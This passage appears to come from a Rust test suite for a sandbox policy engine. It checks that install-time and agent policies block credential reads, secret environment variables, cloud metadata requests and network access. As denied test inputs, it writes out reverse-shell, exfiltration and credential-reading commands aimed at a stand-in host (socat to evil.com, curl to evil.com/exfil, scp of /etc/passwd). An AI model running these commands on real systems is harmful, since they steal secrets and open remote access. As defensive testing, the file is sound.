        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("crypt", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_remote_access() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("ssh user@evil.com");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("scp /etc/passwd user@evil.com:/tmp/");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_keychain() {
        let engine = bash_install_engine();

        let d = engine.evaluate_execution("security find-generic-password -s github.com -w");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_bash_install_blocks_shared_memory() {
        let engine = bash_install_engine();

        let d = engine.evaluate_file("/dev/shm/exfil", Operation::Write);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    // =====================================================================
    // npm-install: base coverage tests
    // =====================================================================

    fn npm_install_engine() -> PolicyEngine {
        let yaml = embedded_policy("npm-install").expect("npm-install policy must exist");
        PolicyEngine::from_yaml(&yaml).expect("npm-install policy must parse")
    }

    #[test]
    fn test_npm_install_policy_parses() {
        let engine = npm_install_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_npm_install_blocks_credential_files() {
        let engine = npm_install_engine();

        let d = engine.evaluate_file("~/.ssh/id_rsa", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.aws/credentials", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("*/.kube/config", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/tmp/server.pem", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_npm_install_blocks_env_secrets() {
        let engine = npm_install_engine();

        let d = engine.evaluate_envvar("AWS_SECRET_ACCESS_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("LD_PRELOAD");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_npm_install_blocks_native_getpass() {
        let engine = npm_install_engine();

        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("crypt", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_npm_install_blocks_network_symbols() {
        let engine = npm_install_engine();

        for sym in &["connect", "socket", "sendto", "bind"] {
            let d = engine.evaluate_native_function(sym, &[]);
            assert_eq!(d.action, PolicyAction::Deny, "{} should be denied", sym);
        }
    }

    #[test]
    fn test_npm_install_blocks_filesystem_bypass_symbols() {
        let engine = npm_install_engine();

        for sym in &["symlink", "link", "syscall"] {
            let d = engine.evaluate_native_function(sym, &[]);
            assert_eq!(d.action, PolicyAction::Deny, "{} should be denied", sym);
        }
    }

    #[test]
    fn test_npm_install_blocks_cloud_metadata() {
        let engine = npm_install_engine();

        let d = engine.evaluate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/",
        );
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "http://metadata.google.internal/computeMetadata/v1/",
            "metadata.google.internal/computeMetadata/v1/",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_npm_install_warns_anonymity_domains() {
        let engine = npm_install_engine();

        let d = engine.evaluate_domain("hidden.onion");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    // =====================================================================
    // pip-install: base coverage tests
    // =====================================================================

    fn pip_install_engine() -> PolicyEngine {
        let yaml = embedded_policy("pip-install").expect("pip-install policy must exist");
        PolicyEngine::from_yaml(&yaml).expect("pip-install policy must parse")
    }

    #[test]
    fn test_pip_install_policy_parses() {
        let engine = pip_install_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_pip_install_blocks_credential_files() {
        let engine = pip_install_engine();

        let d = engine.evaluate_file("~/.ssh/id_rsa", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.aws/credentials", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/tmp/server.pem", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_pip_install_blocks_env_secrets() {
        let engine = pip_install_engine();

        let d = engine.evaluate_envvar("AWS_SECRET_ACCESS_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_pip_install_blocks_native_getpass() {
        let engine = pip_install_engine();

        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_pip_install_blocks_network_symbols() {
        let engine = pip_install_engine();

        for sym in &["connect", "socket", "sendto", "bind"] {
            let d = engine.evaluate_native_function(sym, &[]);
            assert_eq!(d.action, PolicyAction::Deny, "{} should be denied", sym);
        }
    }

    #[test]
    fn test_pip_install_blocks_filesystem_bypass_symbols() {
        let engine = pip_install_engine();

        for sym in &["symlink", "link", "syscall"] {
            let d = engine.evaluate_native_function(sym, &[]);
            assert_eq!(d.action, PolicyAction::Deny, "{} should be denied", sym);
        }
    }

    #[test]
    fn test_pip_install_blocks_cloud_metadata() {
        let engine = pip_install_engine();

        let d = engine.evaluate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_pip_install_warns_anonymity_domains() {
        let engine = pip_install_engine();

        let d = engine.evaluate_domain("hidden.onion");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    // =====================================================================
    // comfyui: additional base coverage tests
    // =====================================================================

    #[test]
    fn test_comfyui_blocks_cloud_metadata() {
        let engine = comfyui_engine();

        let d = engine.evaluate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/",
        );
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "http://metadata.google.internal/computeMetadata/v1/",
            "metadata.google.internal/computeMetadata/v1/",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_blocks_kube_config() {
        let engine = comfyui_engine();

        let d = engine.evaluate_file("*/.kube/config", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_blocks_native_getpass_crypt() {
        let engine = comfyui_engine();

        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("crypt", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_comfyui_blocks_network_symbols() {
        let engine = comfyui_engine();

        for sym in &["connect", "socket", "sendto", "bind"] {
            let d = engine.evaluate_native_function(sym, &[]);
            assert_eq!(d.action, PolicyAction::Deny, "{} should be denied", sym);
        }
    }

    #[test]
    fn test_comfyui_blocks_filesystem_bypass_symbols() {
        let engine = comfyui_engine();

        for sym in &["symlink", "link", "syscall"] {
            let d = engine.evaluate_native_function(sym, &[]);
            assert_eq!(d.action, PolicyAction::Deny, "{} should be denied", sym);
        }
    }

    #[test]
    fn test_comfyui_blocks_anti_tracing_envvars() {
        let engine = comfyui_engine();

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("LD_PRELOAD");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    // =====================================================================
    // base policy: parse test
    // =====================================================================

    #[test]
    fn test_base_policy_parses() {
        let yaml = embedded_policy("base").expect("base policy must exist");
        PolicyEngine::from_yaml(&yaml).expect("base policy must parse");
    }

    // =====================================================================
    // air-gap policy tests
    // =====================================================================

    fn air_gap_engine() -> PolicyEngine {
        let yaml = embedded_policy("air-gap").expect("air-gap policy must exist");
        PolicyEngine::from_yaml(&yaml).expect("air-gap policy must parse")
    }

    #[test]
    fn test_air_gap_policy_parses() {
        let engine = air_gap_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_air_gap_blocks_all_domains() {
        let engine = air_gap_engine();

        let d = engine.evaluate_domain("evil.com");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_domain("localhost");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_domain("169.254.169.254");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_domain("internal.corp.example.com");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_air_gap_blocks_all_urls() {
        let engine = air_gap_engine();

        let d = engine.evaluate_http_url("https://evil.com/exfil", "evil.com/exfil");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/",
        );
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "https://pypi.org/simple/requests/",
            "pypi.org/simple/requests/",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_air_gap_blocks_all_endpoints() {
        let engine = air_gap_engine();

        let d = engine.evaluate_endpoint("evil.com", 443);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_endpoint("127.0.0.1", 8080);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_endpoint("localhost", 22);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_air_gap_blocks_network_commands() {
        let engine = air_gap_engine();

        // HTTP tools
        let d = engine.evaluate_execution("curl https://evil.com/exfil");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("wget https://evil.com/payload");
        assert_eq!(d.action, PolicyAction::Deny);

        // Remote access
        let d = engine.evaluate_execution("ssh user@evil.com");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("scp file user@evil.com:/tmp/");
        assert_eq!(d.action, PolicyAction::Deny);

        // Raw networking
        let d = engine.evaluate_execution("nc evil.com 4444");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("socat TCP:evil.com:4444 EXEC:/bin/bash");
        assert_eq!(d.action, PolicyAction::Deny);

        // DNS tools
        let d = engine.evaluate_execution("dig chunk.exfil.example.com");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("nslookup chunk.exfil.example.com");
        assert_eq!(d.action, PolicyAction::Deny);

        // Privilege escalation
        let d = engine.evaluate_execution("sudo iptables -F");
        assert_eq!(d.action, PolicyAction::Deny);

        // Network configuration
        let d = engine.evaluate_execution("ip addr show");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("ifconfig eth0");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_air_gap_allows_non_network_commands() {
        let engine = air_gap_engine();

        // Commands not in the deny list should be allowed (implicit allow)
        let d = engine.evaluate_execution("ls -la");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("cat /etc/hostname");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("echo hello");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_air_gap_base_files_present() {
        let engine = air_gap_engine();

        let d = engine.evaluate_file("~/.ssh/id_rsa", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.aws/credentials", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/tmp/server.pem", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_air_gap_base_envvars_present() {
        let engine = air_gap_engine();

        let d = engine.evaluate_envvar("AWS_SECRET_ACCESS_KEY");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);

        // Normal envvar allowed
        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_air_gap_base_symbols_present() {
        let engine = air_gap_engine();

        // Credential interception (inlined from base)
        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("crypt", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        // Networking symbols — the core of the air-gap
        let d = engine.evaluate_native_function("socket", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("connect", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("sendto", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("getaddrinfo", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("bind", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("syscall", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    // =====================================================================
    // openclaw detection tests
    // =====================================================================

    #[test]
    fn test_detect_openclaw_direct_binary() {
        assert_eq!(
            detect_policy(&strs(&["openclaw", "gateway"])),
            Some("openclaw"),
        );
    }

    #[test]
    fn test_detect_openclaw_mjs() {
        assert_eq!(
            detect_policy(&strs(&["openclaw.mjs", "doctor"])),
            Some("openclaw"),
        );
    }

    #[test]
    fn test_detect_openclaw_node_with_path() {
        assert_eq!(
            detect_policy(&[
                String::from("node"),
                String::from("/usr/local/lib/node_modules/openclaw/dist/openclaw.mjs"),
            ]),
            Some("openclaw"),
        );
    }

    #[test]
    fn test_detect_openclaw_npm_install_priority() {
        // `npm install openclaw` should match npm-install (not openclaw).
        assert_eq!(
            detect_policy(&strs(&["npm", "install", "openclaw"])),
            Some("npm-install"),
        );
    }

    #[test]
    fn test_detect_openclaw_no_false_positive() {
        // `node server.js` should NOT match openclaw.
        assert_eq!(detect_policy(&strs(&["node", "server.js"])), None,);
    }

    // =====================================================================
    // openclaw auto-policy: attack scenario tests
    // =====================================================================

    fn openclaw_engine() -> PolicyEngine {
        let yaml = embedded_policy("openclaw").expect("openclaw policy must exist");
        PolicyEngine::from_yaml(&yaml).expect("openclaw policy must parse")
    }

    #[test]
    fn test_openclaw_policy_parses() {
        let engine = openclaw_engine();
        assert!(engine.policy().iter_sections().count() > 0);
    }

    #[test]
    fn test_openclaw_nodejs_eval_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_function(Runtime::Node, "eval", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        let d = engine.evaluate_function(Runtime::Node, "vm.runInContext", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Node, "vm.compileFunction", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Node, "child_process.exec", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_function(Runtime::Node, "child_process.execSync", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_nodejs_networking_allowed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_function(Runtime::Node, "net.connect", &[]);
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_function(Runtime::Node, "net.createServer", &[]);
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_function(Runtime::Node, "http.createServer", &[]);
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_function(Runtime::Node, "fetch", &[]);
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_commands_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_execution("curl https://evil.com/exfil");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("wget https://evil.com/payload");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("python3 -c 'import os'");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("perl -e 'system(\"ls\")'");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("base64 /etc/passwd");
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_execution("crontab -e");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_commands_allowed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_execution("node server.js");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("git status");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("npm install express");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("docker run nginx");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("ssh user@gateway.example.com");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_execution("ffmpeg -i input.ogg output.mp3");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_commands_warned() {
        let engine = openclaw_engine();

        let d = engine.evaluate_execution("sh -c 'echo hello'");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_execution("bash -c 'echo hello'");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    #[test]
    fn test_openclaw_commands_reviewed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_execution("sudo coredns");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Review);
    }

    #[test]
    fn test_openclaw_cloud_metadata_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_http_url(
            "http://169.254.169.254/latest/meta-data/",
            "169.254.169.254/latest/meta-data/",
        );
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_http_url(
            "http://metadata.google.internal/computeMetadata/v1/",
            "metadata.google.internal/computeMetadata/v1/",
        );
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_ai_and_chat_apis_allowed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_http_url(
            "https://api.anthropic.com/v1/messages",
            "api.anthropic.com/v1/messages",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url(
            "https://api.openai.com/v1/chat/completions",
            "api.openai.com/v1/chat/completions",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url(
            "https://slack.com/api/chat.postMessage",
            "slack.com/api/chat.postMessage",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url(
            "https://api.telegram.org/bot123/sendMessage",
            "api.telegram.org/bot123/sendMessage",
        );
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url(
            "https://discord.com/api/v10/channels/123/messages",
            "discord.com/api/v10/channels/123/messages",
        );
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_localhost_allowed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_http_url("http://127.0.0.1:3000/health", "127.0.0.1:3000/health");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_http_url("http://localhost:8080/api", "localhost:8080/api");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_unlisted_domains_denied() {
        let engine = openclaw_engine();

        let d = engine.evaluate_http_url("https://evil.com/exfil", "evil.com/exfil");
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_protocols_restricted() {
        let engine = openclaw_engine();

        assert_eq!(
            engine.evaluate_protocol("https").action,
            PolicyAction::Allow
        );
        assert_eq!(engine.evaluate_protocol("http").action, PolicyAction::Allow);
        assert_eq!(engine.evaluate_protocol("wss").action, PolicyAction::Allow);
        assert_eq!(engine.evaluate_protocol("ws").action, PolicyAction::Allow);

        assert_eq!(engine.evaluate_protocol("tcp").action, PolicyAction::Deny);
        assert_eq!(engine.evaluate_protocol("udp").action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_credential_files_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_file("~/.ssh/id_rsa", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("~/.aws/credentials", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/tmp/server.pem", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_file("/home/user/.ssh/id_ed25519", Operation::Read);
        assert_eq!(d.action, PolicyAction::Deny);

        // Normal files allowed
        let d = engine.evaluate_file("/tmp/config.json", Operation::Read);
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_hard_secrets_blocked() {
        let engine = openclaw_engine();

        // Block mode for infrastructure credentials
        let d = engine.evaluate_envvar("MY_SECRET");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        let d = engine.evaluate_envvar("AWS_ACCESS_KEY_ID");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        let d = engine.evaluate_envvar("GITHUB_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);
    }

    #[test]
    fn test_openclaw_legitimate_keys_warned() {
        let engine = openclaw_engine();

        // Warn mode for keys openclaw legitimately reads
        let d = engine.evaluate_envvar("OPENAI_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_envvar("ANTHROPIC_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_envvar("CLAUDE_API_KEY");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_envvar("OPENCLAW_PORT");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_envvar("HF_TOKEN");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }

    #[test]
    fn test_openclaw_normal_envvars_allowed() {
        let engine = openclaw_engine();

        let d = engine.evaluate_envvar("HOME");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_envvar("PATH");
        assert_eq!(d.action, PolicyAction::Allow);

        let d = engine.evaluate_envvar("NODE_ENV");
        assert_eq!(d.action, PolicyAction::Allow);
    }

    #[test]
    fn test_openclaw_anti_tracing_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_envvar("DYLD_INSERT_LIBRARIES");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);

        let d = engine.evaluate_envvar("LD_PRELOAD");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Block);
    }

    #[test]
    fn test_openclaw_native_getpass_blocked() {
        let engine = openclaw_engine();

        let d = engine.evaluate_native_function("getpass", &[]);
        assert_eq!(d.action, PolicyAction::Deny);

        let d = engine.evaluate_native_function("crypt", &[]);
        assert_eq!(d.action, PolicyAction::Deny);
    }

    #[test]
    fn test_openclaw_blocks_network_symbols() {
        let engine = openclaw_engine();

        for sym in &["connect", "socket", "sendto", "bind"] {
            let d = engine.evaluate_native_function(sym, &[]);
            assert_eq!(d.action, PolicyAction::Deny, "{} should be denied", sym);
        }
    }

    #[test]
    fn test_openclaw_blocks_filesystem_bypass_symbols() {
        let engine = openclaw_engine();

        for sym in &["symlink", "link", "syscall"] {
            let d = engine.evaluate_native_function(sym, &[]);
            assert_eq!(d.action, PolicyAction::Deny, "{} should be denied", sym);
        }
    }

    #[test]
    fn test_openclaw_anonymity_domains_warned() {
        let engine = openclaw_engine();

        let d = engine.evaluate_domain("hidden.onion");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_domain("service.i2p");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);

        let d = engine.evaluate_domain("tunnel.loki");
        assert_eq!(d.action, PolicyAction::Deny);
        assert_eq!(d.section_mode(), EnforcementMode::Warn);
    }
}
